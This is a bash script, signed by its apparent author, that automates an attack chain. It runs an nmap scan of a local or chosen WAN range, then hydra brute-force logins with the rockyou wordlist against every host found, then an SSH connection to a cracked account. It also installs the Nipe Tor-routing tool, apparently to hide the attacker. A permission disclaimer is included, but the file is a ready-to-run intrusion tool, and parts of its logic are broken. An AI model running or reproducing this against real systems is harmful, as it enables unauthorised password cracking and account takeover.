#!/bin/bash

# This script will scan network and save a list of all open ports to a file called open_ports.txt.
# It will then read in this list of open ports and run hydra on each port to perform a brute-force attack using the specified username and password list.
# Keep in mind that running brute-force attacks on network targets without permission is illegal and can result in serious consequences.
# It is important to only use this script for testing and educational purposes on systems that you have permission to attack.

# Install the needed applications if they are not already installed
if ! [ -x "$(command -v nmap)" ]; then
  echo "Installing Nmap..."
  sudo apt-get update
  sudo apt-get install nmap
fi
if ! [ -x "$(command -v hydra)" ]; then
  echo "Installing Hydra..."
  sudo apt-get update
  sudo apt-get install hydra
fi
if ! [ -x "$(command -v figlet)" ]; then
  echo "Installing Figlet..."
  sudo apt-get update
  sudo apt-get install -y figlet
fi
if ! [ -x "$(command -v perl)" ]; then
  echo "Installing Nipe..."
  sudo apt-get update
  git clone https://github.com/htrgouvea/nipe && cd nipe
  sudo cpan install Try::Tiny Config::Simple JSON
  sudo perl nipe.pl install
fi

echo -e '\033[1;34mWELL, \tARR \tYOU \tREADY?'
echo -e '\033[0;34mThis is your Privet IP Address:'
IP_user=`ip a s | egrep -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | grep -v 127.0.0.1 | grep -v '255'`
echo -e '\033[1;31m'$IP_user
echo -e '\033[0mThink before you click.'

# Ask the user if they want to scan their private network class or insert an IP range
read -p 'Enter 1 to scan your private network in C class or 2 to insert an IP range: ' choice

if [[ $choice -eq 1 ]]; then
	# Scan the user's private network class using nmap
	IP_class=`ip a s | tail -n4 | head -n1 | awk '{print $2}'`
	nmap -Pn -T4 -oG - $IP_class | grep "open" > open_ports.txt
else
	# Ask the user if they want to scan WAN or LAN
	read -p 'Enter 1 to scan WAN or 2 to scan LAN: ' choice2
	if [[ $choice2 -eq 1 ]]; then
		# Ask the user for an IP to scan
		read -p "Enter the IP to scan: " ip_range
		# We on WAN, who is we trying to scan?
		whois $ip_range
		nmap -Pn -T4 $ip_range -oG open_ports.txt | grep "open" > open_ports.txt
	else
		# Ask the user for an IP range to scan
		read -p "Enter the IP range to scan: " ip_range
		# Scan the specified IP range using nmap
		nmap -Pn -T4 $ip_range -oG open_ports.txt | grep "open" > open_ports.txt
	fi
fi

# Save all live IP to specific list
cat open_ports.txt | awk '{print $2}' > IP_list.txt
cat 'open_ports.txt'

# Next stage
echo -e "\033[1;34mOK, we done with scanning, let's move on to 'brute-forcing'."
echo -e '\033[0mBe careful, this is no game.'

# Ask the user if they want to see the scan results or continue
read -p 'Following the open ports found, plz insert port to BF: ' port
read -p 'Following the open ports found, plz insert service to BF: ' service

figlet 'Start cracking'
# Read in the list of open ports
# Run hydra on each open port to perform a brute-force attack
hydra -s $port -L 'usernames.txt' -P '/usr/share/wordlists/rockyou.txt.gz' -M 'IP_list.txt' -t 4 -e nsr $service -o hydra.log 

# Get the username and password found during the brute-force attack
read -p 'SSH only-insert user to hack: ' user_hack
read -p 'SSH only-insert IP to hack: ' IP_hack
# Connect to the open port using the username and password found
ssh $user_hack@$IP_hack -p 22

# Amit Cohen Scali
# Sreach me on LinkedIn - https://www.linkedin.com/in/amcos/
